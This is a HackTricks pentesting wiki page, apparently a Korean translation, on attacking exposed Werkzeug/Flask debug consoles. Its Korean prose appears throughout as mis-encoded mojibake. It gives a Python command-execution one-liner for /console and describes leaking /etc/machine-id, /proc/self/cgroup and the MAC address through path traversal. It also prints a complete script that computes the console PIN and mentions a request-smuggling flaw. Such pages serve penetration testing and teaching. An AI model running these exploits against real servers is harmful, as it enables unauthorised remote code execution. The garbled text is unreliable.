# Werkzeug / Flask Debug

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**ì›¹ ì•±, ë„¤íŠ¸ì›Œí¬ ë° í´ë¼ìš°ë“œì— ëŒ€í•œ í•´ì»¤ì˜ ê´€ì ì„ ì–»ìœ¼ì„¸ìš”.**

**ì‹¤ì œ ë¹„ì¦ˆë‹ˆìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ì°¾ì•„ë³´ê³  ë³´ê³ í•˜ì„¸ìš”.** ê³µê²© í‘œë©´ì„ ë§¤í•‘í•˜ê³  ê¶Œí•œ ìƒìŠ¹ì„ í—ˆìš©í•˜ëŠ” ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ì•„ë‚´ë©°, í•„ìˆ˜ ì¦ê±°ë¥¼ ìˆ˜ì§‘í•˜ê¸° ìœ„í•´ ìë™í™”ëœ ìµìŠ¤í”Œë¡œì‡ì„ ì‚¬ìš©í•˜ì—¬ ê·€í•˜ì˜ ë…¸ë ¥ì„ ì„¤ë“ë ¥ ìˆëŠ” ë³´ê³ ì„œë¡œ ì „í™˜í•˜ëŠ” 20ê°œ ì´ìƒì˜ ë§ì¶¤í˜• ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Console RCE

ë””ë²„ê·¸ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ `/console`ì— ì ‘ê·¼í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

ì¸í„°ë„·ì—ëŠ” [ì´ê²ƒ](https://github.com/its-arun/Werkzeug-Debug-RCE)ê³¼ ê°™ì€ ì—¬ëŸ¬ ìµìŠ¤í”Œë¡œì‡ì´ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” ë©”íƒ€ìŠ¤í”Œë¡œì‡ì—ì„œ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## í•€ ë³´í˜¸ - ê²½ë¡œ íƒìƒ‰

ì¼ë¶€ ê²½ìš° **`/console`** ì—”ë“œí¬ì¸íŠ¸ëŠ” í•€ìœ¼ë¡œ ë³´í˜¸ë©ë‹ˆë‹¤. **íŒŒì¼ íƒìƒ‰ ì·¨ì•½ì **ì´ ìˆëŠ” ê²½ìš° í•´ë‹¹ í•€ì„ ìƒì„±í•˜ëŠ” ë° í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Werkzeug ì½˜ì†” PIN ìµìŠ¤í”Œë¡œì‡

ì•±ì—ì„œ ë””ë²„ê·¸ ì˜¤ë¥˜ í˜ì´ì§€ë¥¼ ê°•ì œë¡œ í‘œì‹œí•˜ì—¬ ì´ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
A message regarding the "console locked" scenario is encountered when attempting to access Werkzeug's debug interface, indicating a requirement for a PIN to unlock the console. The suggestion is made to exploit the console PIN by analyzing the PIN generation algorithm in Werkzeugâ€™s debug initialization file (`__init__.py`). The PIN generation mechanism can be studied from the [**Werkzeug source code repository**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), though it is advised to procure the actual server code via a file traversal vulnerability due to potential version discrepancies.

ì½˜ì†” PINì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ë‘ ì„¸íŠ¸ì˜ ë³€ìˆ˜ê°€ í•„ìš”í•©ë‹ˆë‹¤: 

#### **`probably_public_bits`**

* **`username`**: Flask ì„¸ì…˜ì„ ì‹œì‘í•œ ì‚¬ìš©ìë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* **`modname`**: ì¼ë°˜ì ìœ¼ë¡œ `flask.app`ìœ¼ë¡œ ì§€ì •ë©ë‹ˆë‹¤.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: ì¼ë°˜ì ìœ¼ë¡œ **Flask**ë¡œ í•´ê²°ë©ë‹ˆë‹¤.
* **`getattr(mod, '__file__', None)`**: Flask ë””ë ‰í† ë¦¬ ë‚´ì˜ `app.py`ì— ëŒ€í•œ ì „ì²´ ê²½ë¡œë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤ (ì˜ˆ: `/usr/local/lib/python3.5/dist-packages/flask/app.py`). `app.py`ê°€ ì ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°, **`app.pyc`ë¥¼ ì‹œë„í•˜ì‹­ì‹œì˜¤**.

#### **`private_bits`**

* **`uuid.getnode()`**: í˜„ì¬ ë¨¸ì‹ ì˜ MAC ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ë©°, `str(uuid.getnode())`ëŠ” ì´ë¥¼ 10ì§„ìˆ˜ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.
* **ì„œë²„ì˜ MAC ì£¼ì†Œë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´**, ì•±ì—ì„œ ì‚¬ìš©ë˜ëŠ” í™œì„± ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì‹ë³„í•´ì•¼ í•©ë‹ˆë‹¤ (ì˜ˆ: `ens3`). ë¶ˆí™•ì‹¤í•œ ê²½ìš°, **`/proc/net/arp`ë¥¼ ëˆ„ì¶œí•˜ì—¬** ì¥ì¹˜ IDë¥¼ ì°¾ê³ , **`/sys/class/net/<device id>/address`ì—ì„œ MAC ì£¼ì†Œë¥¼ ì¶”ì¶œí•˜ì‹­ì‹œì˜¤**.
* 16ì§„ìˆ˜ MAC ì£¼ì†Œë¥¼ 10ì§„ìˆ˜ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤:

```python
# ì˜ˆì‹œ MAC ì£¼ì†Œ: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` ë˜ëŠ” `/proc/sys/kernel/random/boot_id`ì˜ ë°ì´í„°ë¥¼ ë§ˆì§€ë§‰ ìŠ¬ë˜ì‹œ(`/`) ì´í›„ì˜ `/proc/self/cgroup`ì˜ ì²« ë²ˆì§¸ ì¤„ê³¼ ì—°ê²°í•©ë‹ˆë‹¤.

<details>

<summary>Code for `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

ëª¨ë“  í•„ìš”í•œ ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•œ í›„, ìµìŠ¤í”Œë¡œì‡ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ Werkzeug ì½˜ì†” PINì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ëª¨ë“  í•„ìš”í•œ ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•œ í›„, ìµìŠ¤í”Œë¡œì‡ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ Werkzeug ì½˜ì†” PINì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì¡°í•©ëœ `probably_public_bits`ì™€ `private_bits`ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ì‹œë¥¼ ìƒì„±í•œ ë‹¤ìŒ, ìµœì¢… PINì„ ìƒì„±í•˜ê¸° ìœ„í•´ ì¶”ê°€ ì²˜ë¦¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì•„ë˜ëŠ” ì´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ Python ì½”ë“œì…ë‹ˆë‹¤:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì—°ê²°ëœ ë¹„íŠ¸ë¥¼ í•´ì‹±í•˜ê³  íŠ¹ì • ì†”íŠ¸(`cookiesalt` ë° `pinsalt`)ë¥¼ ì¶”ê°€í•˜ë©° ì¶œë ¥ì„ í˜•ì‹í™”í•˜ì—¬ PINì„ ìƒì„±í•©ë‹ˆë‹¤. ì‹¤ì œ `probably_public_bits` ë° `private_bits`ì˜ ê°’ì€ Werkzeug ì½˜ì†”ì—ì„œ ì˜ˆìƒë˜ëŠ” PINê³¼ ì¼ì¹˜í•˜ë„ë¡ ëª©í‘œ ì‹œìŠ¤í…œì—ì„œ ì •í™•í•˜ê²Œ ì–»ì–´ì•¼ í•œë‹¤ëŠ” ì ì— ìœ ì˜í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

{% hint style="success" %}
**ì˜¤ë˜ëœ ë²„ì „**ì˜ Werkzeugë¥¼ ì‚¬ìš© ì¤‘ì´ë¼ë©´ **í•´ì‹± ì•Œê³ ë¦¬ì¦˜ì„ sha1 ëŒ€ì‹  md5ë¡œ ë³€ê²½**í•´ ë³´ì‹­ì‹œì˜¤.
{% endhint %}

## Werkzeug ìœ ë‹ˆì½”ë“œ ë¬¸ì

[**ì´ ë¬¸ì œ**](https://github.com/pallets/werkzeug/issues/2833)ì—ì„œ ê´€ì°°ëœ ë°”ì™€ ê°™ì´, WerkzeugëŠ” í—¤ë”ì— ìœ ë‹ˆì½”ë“œ ë¬¸ìê°€ í¬í•¨ëœ ìš”ì²­ì„ ë‹«ì§€ ì•ŠìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  [**ì´ ê¸€**](https://mizu.re/post/twisty-python)ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´, ì´ëŠ” CL.0 ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ ì·¨ì•½ì ì„ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” Werkzeugì—ì„œ ì¼ë¶€ **ìœ ë‹ˆì½”ë“œ** ë¬¸ìë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ì„œë²„ê°€ **ì¤‘ë‹¨**ë  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ HTTP ì—°ê²°ì´ **`Connection: keep-alive`** í—¤ë”ë¡œ ìƒì„±ëœ ê²½ìš° ìš”ì²­ì˜ ë³¸ë¬¸ì€ ì½íˆì§€ ì•Šìœ¼ë©° ì—°ê²°ì€ ì—¬ì „íˆ ì—´ë ¤ ìˆìœ¼ë¯€ë¡œ ìš”ì²­ì˜ **ë³¸ë¬¸**ì€ **ë‹¤ìŒ HTTP ìš”ì²­**ìœ¼ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.

## ìë™í™”ëœ ì•…ìš©

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## ì°¸ê³ ìë£Œ

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**ì›¹ ì•±, ë„¤íŠ¸ì›Œí¬ ë° í´ë¼ìš°ë“œì— ëŒ€í•œ í•´ì»¤ì˜ ê´€ì ì„ ì–»ìœ¼ì‹­ì‹œì˜¤.**

**ì‹¤ì œ ë¹„ì¦ˆë‹ˆìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì¤‘ìš”í•œ ì•…ìš© ê°€ëŠ¥í•œ ì·¨ì•½ì ì„ ì°¾ì•„ë³´ê³  ë³´ê³ í•˜ì‹­ì‹œì˜¤.** 20ê°œ ì´ìƒì˜ ë§ì¶¤í˜• ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê²© í‘œë©´ì„ ë§¤í•‘í•˜ê³  ê¶Œí•œ ìƒìŠ¹ì„ í—ˆìš©í•˜ëŠ” ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ì•„ë‚´ë©°, ìë™í™”ëœ ì•…ìš©ì„ ì‚¬ìš©í•˜ì—¬ í•„ìˆ˜ ì¦ê±°ë¥¼ ìˆ˜ì§‘í•˜ì—¬ ê·€í•˜ì˜ ë…¸ë ¥ì„ ì„¤ë“ë ¥ ìˆëŠ” ë³´ê³ ì„œë¡œ ì „í™˜í•˜ì‹­ì‹œì˜¤.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
